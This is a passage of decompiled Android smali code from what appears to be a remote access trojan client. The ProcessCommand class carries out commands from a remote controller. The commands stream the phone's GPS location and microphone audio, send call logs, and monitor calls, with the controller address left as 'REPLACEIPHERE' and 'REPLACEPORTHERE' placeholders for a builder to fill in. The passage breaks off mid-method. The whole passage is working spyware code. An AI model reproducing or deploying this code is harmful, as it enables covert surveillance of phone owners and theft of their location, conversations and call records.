.class public Lmy/app/client/ProcessCommand;
.super Ljava/lang/Object;
.source "ProcessCommand.java"


# instance fields
.field arguments:Ljava/nio/ByteBuffer;

.field chan:I

.field client:Lmy/app/client/ClientListener;

.field commande:S

.field editor:Landroid/content/SharedPreferences$Editor;

.field intent:Landroid/content/Intent;

.field settings:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>(Lmy/app/client/ClientListener;)V
    .locals 3
    .parameter "c"

    .prologue
    .line 66
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 68
    iput-object p1, p0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    .line 69
    iget-object v0, p0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v1, "preferences.xml"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Lmy/app/client/ClientListener;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lmy/app/client/ProcessCommand;->settings:Landroid/content/SharedPreferences;

    .line 70
    iget-object v0, p0, Lmy/app/client/ProcessCommand;->settings:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    iput-object v0, p0, Lmy/app/client/ProcessCommand;->editor:Landroid/content/SharedPreferences$Editor;

    .line 71
    return-void
.end method

.method private MessageDecoupator(Ljava/lang/String;)Ljava/util/ArrayList;
    .locals 4
    .parameter "text"
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 336
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 338
    .local v0, multipleMsg:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    const/4 v1, 0x0

    .line 339
    .local v1, taille:I
    :goto_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    if-lt v1, v2, :cond_0

    .line 350
    return-object v0

    .line 341
    :cond_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    sub-int v2, v1, v2

    const/16 v3, 0xa7

    if-ge v2, v3, :cond_1

    .line 343
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    invoke-virtual {p1, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 348
    :goto_1
    add-int/lit16 v1, v1, 0xa7

    goto :goto_0

    .line 346
    :cond_1
    add-int/lit16 v2, v1, 0xa7

    invoke-virtual {p1, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_1
.end method

.method private savePreferences([B)V
    .locals 13
    .parameter "data"

    .prologue
    .line 286
    new-instance v4, LPacket/PreferencePacket;

    invoke-direct {v4}, LPacket/PreferencePacket;-><init>()V

    .line 287
    .local v4, pp:LPacket/PreferencePacket;
    invoke-virtual {v4, p1}, LPacket/PreferencePacket;->parse([B)V

    .line 289
    iget-object v10, p0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v11, "preferences"

    const/4 v12, 0x0

    invoke-virtual {v10, v11, v12}, Lmy/app/client/ClientListener;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    .line 291
    .local v5, settings:Landroid/content/SharedPreferences;
    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 292
    .local v0, editor:Landroid/content/SharedPreferences$Editor;
    const-string v10, "ip"

    invoke-virtual {v4}, LPacket/PreferencePacket;->getIp()Ljava/lang/String;

    move-result-object v11

    invoke-interface {v0, v10, v11}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 293
    const-string v10, "port"

    invoke-virtual {v4}, LPacket/PreferencePacket;->getPort()I

    move-result v11

    invoke-interface {v0, v10, v11}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 294
    const-string v10, "waitTrigger"

    invoke-virtual {v4}, LPacket/PreferencePacket;->isWaitTrigger()Z

    move-result v11

    invoke-interface {v0, v10, v11}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 296
    const-string v7, ""

    .line 297
    .local v7, smsKeyWords:Ljava/lang/String;
    const-string v2, ""

    .line 298
    .local v2, numsCall:Ljava/lang/String;
    const-string v3, ""

    .line 300
    .local v3, numsSMS:Ljava/lang/String;
    invoke-virtual {v4}, LPacket/PreferencePacket;->getKeywordSMS()Ljava/util/ArrayList;

    move-result-object v6

    .line 301
    .local v6, smsKeyWord:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    const/4 v1, 0x0

    .local v1, i:I
    :goto_0
    invoke-virtual {v6}, Ljava/util/ArrayList;->size()I

    move-result v10

    if-lt v1, v10, :cond_0

    .line 308
    const-string v10, "smsKeyWords"

    invoke-interface {v0, v10, v7}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 310
    invoke-virtual {v4}, LPacket/PreferencePacket;->getPhoneNumberCall()Ljava/util/ArrayList;

    move-result-object v8

    .line 311
    .local v8, whiteListCall:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    const/4 v1, 0x0

    :goto_1
    invoke-virtual {v8}, Ljava/util/ArrayList;->size()I

    move-result v10

    if-lt v1, v10, :cond_2

    .line 318
    const-string v10, "numCall"

    invoke-interface {v0, v10, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 321
    invoke-virtual {v4}, LPacket/PreferencePacket;->getPhoneNumberSMS()Ljava/util/ArrayList;

    move-result-object v9

    .line 322
    .local v9, whiteListSMS:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    const/4 v1, 0x0

    :goto_2
    invoke-virtual {v9}, Ljava/util/ArrayList;->size()I

    move-result v10

    if-lt v1, v10, :cond_4

    .line 329
    const-string v10, "numSMS"

    invoke-interface {v0, v10, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 330
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 332
    return-void

    .line 303
    .end local v8           #whiteListCall:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v9           #whiteListSMS:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_0
    invoke-virtual {v6}, Ljava/util/ArrayList;->size()I

    move-result v10

    add-int/lit8 v10, v10, -0x1

    if-ne v1, v10, :cond_1

    .line 304
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 301
    :goto_3
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 306
    :cond_1
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ";"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    goto :goto_3

    .line 313
    .restart local v8       #whiteListCall:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_2
    invoke-virtual {v8}, Ljava/util/ArrayList;->size()I

    move-result v10

    add-int/lit8 v10, v10, -0x1

    if-ne v1, v10, :cond_3

    .line 314
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 311
    :goto_4
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    .line 316
    :cond_3
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ";"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_4

    .line 324
    .restart local v9       #whiteListSMS:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_4
    invoke-virtual {v9}, Ljava/util/ArrayList;->size()I

    move-result v10

    add-int/lit8 v10, v10, -0x1

    if-ne v1, v10, :cond_5

    .line 325
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 322
    :goto_5
    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_2

    .line 327
    :cond_5
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ";"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    goto :goto_5
.end method


# virtual methods
.method public loadPreferences()LPacket/PreferencePacket;
    .locals 12

    .prologue
    const/4 v11, 0x0

    .line 234
    new-instance v3, LPacket/PreferencePacket;

    invoke-direct {v3}, LPacket/PreferencePacket;-><init>()V

    .line 236
    .local v3, p:LPacket/PreferencePacket;
    iget-object v9, p0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v10, "preferences"

    invoke-virtual {v9, v10, v11}, Lmy/app/client/ClientListener;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    .line 238
    .local v4, settings:Landroid/content/SharedPreferences;
    const-string v9, "ip"

    const-string v10, "REPLACEIPHERE"

    invoke-interface {v4, v9, v10}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v9}, LPacket/PreferencePacket;->setIp(Ljava/lang/String;)V

    .line 239
    const-string v9, "port"

    const/16 v10, REPLACEPORTHERE

    invoke-interface {v4, v9, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v9

    invoke-virtual {v3, v9}, LPacket/PreferencePacket;->setPort(I)V

    .line 240
    const-string v9, "waitTrigger"

    invoke-interface {v4, v9, v11}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v9

    invoke-virtual {v3, v9}, LPacket/PreferencePacket;->setWaitTrigger(Z)V

    .line 242
    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    .line 243
    .local v5, smsKeyWords:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    const-string v9, "smsKeyWords"

    const-string v10, ""

    invoke-interface {v4, v9, v10}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 244
    .local v0, keywords:Ljava/lang/String;
    const-string v9, ""

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_0

    .line 245
    const/4 v5, 0x0

    .line 255
    :goto_0
    new-instance v7, Ljava/util/ArrayList;

    invoke-direct {v7}, Ljava/util/ArrayList;-><init>()V

    .line 256
    .local v7, whiteListCall:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    const-string v9, "numCall"

    const-string v10, ""

    invoke-interface {v4, v9, v10}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 257
    .local v1, listCall:Ljava/lang/String;
    const-string v9, ""

    invoke-virtual {v1, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_2

    .line 258
    const/4 v7, 0x0

    .line 269
    :goto_1
    new-instance v8, Ljava/util/ArrayList;

    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    .line 270
    .local v8, whiteListSMS:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    const-string v9, "numSMS"

    const-string v10, ""

    invoke-interface {v4, v9, v10}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 271
    .local v2, listSMS:Ljava/lang/String;
    const-string v9, ""

    invoke-virtual {v2, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_4

    .line 272
    const/4 v8, 0x0

    .line 281
    :goto_2
    return-object v3

    .line 247
    .end local v1           #listCall:Ljava/lang/String;
    .end local v2           #listSMS:Ljava/lang/String;
    .end local v7           #whiteListCall:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v8           #whiteListSMS:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_0
    new-instance v6, Ljava/util/StringTokenizer;

    const-string v9, ";"

    invoke-direct {v6, v0, v9}, Ljava/util/StringTokenizer;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 248
    .local v6, st:Ljava/util/StringTokenizer;
    :goto_3
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->hasMoreTokens()Z

    move-result v9

    if-nez v9, :cond_1

    .line 252
    invoke-virtual {v3, v5}, LPacket/PreferencePacket;->setKeywordSMS(Ljava/util/ArrayList;)V

    goto :goto_0

    .line 250
    :cond_1
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->nextToken()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_3

    .line 260
    .end local v6           #st:Ljava/util/StringTokenizer;
    .restart local v1       #listCall:Ljava/lang/String;
    .restart local v7       #whiteListCall:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_2
    new-instance v6, Ljava/util/StringTokenizer;

    const-string v9, ";"

    invoke-direct {v6, v1, v9}, Ljava/util/StringTokenizer;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 261
    .restart local v6       #st:Ljava/util/StringTokenizer;
    :goto_4
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->hasMoreTokens()Z

    move-result v9

    if-nez v9, :cond_3

    .line 265
    invoke-virtual {v3, v7}, LPacket/PreferencePacket;->setPhoneNumberCall(Ljava/util/ArrayList;)V

    goto :goto_1

    .line 263
    :cond_3
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->nextToken()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_4

    .line 274
    .end local v6           #st:Ljava/util/StringTokenizer;
    .restart local v2       #listSMS:Ljava/lang/String;
    .restart local v8       #whiteListSMS:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_4
    new-instance v6, Ljava/util/StringTokenizer;

    const-string v9, ";"

    invoke-direct {v6, v2, v9}, Ljava/util/StringTokenizer;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 275
    .restart local v6       #st:Ljava/util/StringTokenizer;
    :goto_5
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->hasMoreTokens()Z

    move-result v9

    if-nez v9, :cond_5

    .line 279
    invoke-virtual {v3, v8}, LPacket/PreferencePacket;->setPhoneNumberSMS(Ljava/util/ArrayList;)V

    goto :goto_2

    .line 277
    :cond_5
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->nextToken()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_5
.end method

.method public process(S[BI)V
    .locals 21
    .parameter "cmd"
    .parameter "args"
    .parameter "chan"

    .prologue
    .line 75
    move/from16 v0, p1

    move-object/from16 v1, p0

    iput-short v0, v1, Lmy/app/client/ProcessCommand;->commande:S

    .line 76
    move/from16 v0, p3

    move-object/from16 v1, p0

    iput v0, v1, Lmy/app/client/ProcessCommand;->chan:I

    .line 77
    invoke-static/range {p2 .. p2}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    .line 79
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_GPS_STREAM:S

    if-ne v2, v4, :cond_3

    .line 81
    new-instance v17, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    move-object/from16 v0, v17

    invoke-direct {v0, v2}, Ljava/lang/String;-><init>([B)V

    .line 83
    .local v17, provider:Ljava/lang/String;
    const-string v2, "network"

    move-object/from16 v0, v17

    invoke-virtual {v0, v2}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v2

    if-eqz v2, :cond_0

    const-string v2, "gps"

    move-object/from16 v0, v17

    invoke-virtual {v0, v2}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_2

    .line 84
    :cond_0
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/GPSListener;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, v17

    move/from16 v1, p3

    invoke-direct {v4, v6, v0, v1}, Lmy/app/Library/GPSListener;-><init>(Landroid/location/LocationListener;Ljava/lang/String;I)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->gps:Lmy/app/Library/GPSListener;

    .line 85
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Location request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 230
    .end local v17           #provider:Ljava/lang/String;
    :cond_1
    :goto_0
    return-void

    .line 88
    .restart local v17       #provider:Ljava/lang/String;
    :cond_2
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "Unknown provider \'"

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v17

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "\' for location"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto :goto_0

    .line 90
    .end local v17           #provider:Ljava/lang/String;
    :cond_3
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->STOP_GPS_STREAM:S

    if-ne v2, v4, :cond_4

    .line 92
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->gps:Lmy/app/Library/GPSListener;

    invoke-virtual {v2}, Lmy/app/Library/GPSListener;->stop()V

    .line 93
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const/4 v4, 0x0

    iput-object v4, v2, Lmy/app/client/ClientListener;->gps:Lmy/app/Library/GPSListener;

    .line 94
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Location stopped"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    goto :goto_0

    .line 96
    :cond_4
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_SOUND_STREAM:S

    if-ne v2, v4, :cond_5

    .line 98
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Audio streaming request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 99
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/AudioStreamer;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v7, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v7}, Ljava/nio/ByteBuffer;->getInt()I

    move-result v7

    move/from16 v0, p3

    invoke-direct {v4, v6, v7, v0}, Lmy/app/Library/AudioStreamer;-><init>(Landroid/media/AudioRecord$OnRecordPositionUpdateListener;II)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->audioStreamer:Lmy/app/Library/AudioStreamer;

    .line 100
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->audioStreamer:Lmy/app/Library/AudioStreamer;

    invoke-virtual {v2}, Lmy/app/Library/AudioStreamer;->run()V

    goto :goto_0

    .line 102
    :cond_5
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->STOP_SOUND_STREAM:S

    if-ne v2, v4, :cond_6

    .line 104
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->audioStreamer:Lmy/app/Library/AudioStreamer;

    invoke-virtual {v2}, Lmy/app/Library/AudioStreamer;->stop()V

    .line 105
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const/4 v4, 0x0

    iput-object v4, v2, Lmy/app/client/ClientListener;->audioStreamer:Lmy/app/Library/AudioStreamer;

    .line 106
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Audio streaming stopped"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 108
    :cond_6
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_CALL_LOGS:S

    if-ne v2, v4, :cond_7

    .line 110
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Call log request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 111
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v4, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v4}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v4

    move/from16 v0, p3

    invoke-static {v2, v0, v4}, Lmy/app/Library/CallLogLister;->listCallLog(Lmy/app/client/ClientListener;I[B)Z

    move-result v2

    if-nez v2, :cond_1

    .line 112
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "No call logs"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 114
    :cond_7
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->MONITOR_CALL:S

    if-ne v2, v4, :cond_8

    .line 116
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Start monitoring call"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 117
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/CallMonitor;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v7, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v7}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v7

    move/from16 v0, p3

    invoke-direct {v4, v6, v0, v7}, Lmy/app/Library/CallMonitor;-><init>(Lmy/app/client/ClientListener;I[B)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->callMonitor:Lmy/app/Library/CallMonitor;

    goto/16 :goto_0

    .line 119
    :cond_8
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->STOP_MONITOR_CALL:S

    if-ne v2, v4, :cond_9

    .line 121
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

